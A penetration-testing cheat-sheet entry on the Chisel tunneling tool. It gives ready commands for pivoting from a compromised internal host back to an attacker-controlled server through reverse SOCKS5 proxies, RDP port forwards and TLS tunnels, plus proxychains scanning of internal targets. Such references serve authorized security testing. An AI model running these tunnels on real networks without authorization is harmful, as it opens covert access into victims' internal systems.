# 08.01 Chisel

> Fast TCP/UDP tunneling over HTTP/SSH — the modern alternative to ssh -L/-D for pivoting.

## Overview

Chisel is a Go-based fast tunneling tool. Single binary on both ends. Supports forward, reverse, and SOCKS5 tunnels. TCP and UDP. TLS optional. Critical for pivoting through compromised hosts without standing up VPN infrastructure. Works behind NAT (reverse tunnel mode).

## Steps

- **Step 1** - Get binary on attacker + target.
- **Step 2** - Start server on attacker.
- **Step 3** - Start client on target with desired tunnel spec.

## Commands

### Get binary

```bash
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_*_linux_amd64.gz
gunzip chisel_*.gz
chmod +x chisel
# Windows binary too
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_*_windows_amd64.gz
```

### SOCKS5 reverse proxy (most common)

```bash
# Attacker (public)
./chisel server --port 8080 --reverse
# Target (compromised internal host)
./chisel client <ATTACKER>:8080 R:1080:socks
# Now use ATTACKER:1080 as SOCKS5 proxy
proxychains -q nmap -sT -Pn -p 445 <INTERNAL-TARGET>
```

### Reverse port forward

```bash
# Attacker
./chisel server --port 8080 --reverse
# Target — forward target:3389 back to attacker:13389
./chisel client <ATTACKER>:8080 R:13389:127.0.0.1:3389
# Attacker now connects:
rdesktop 127.0.0.1:13389
```

### Forward TCP

```bash
# Server
./chisel server --port 8080
# Client (target) accepts forward to internal:80
./chisel client <ATTACKER>:8080 13380:<INTERNAL>:80
```

### TLS with self-signed cert

```bash
# Server
./chisel server --port 8443 --tls-key key.pem --tls-cert cert.pem --reverse
# Client
./chisel client https://<ATTACKER>:8443 --tls-skip-verify R:1080:socks
```
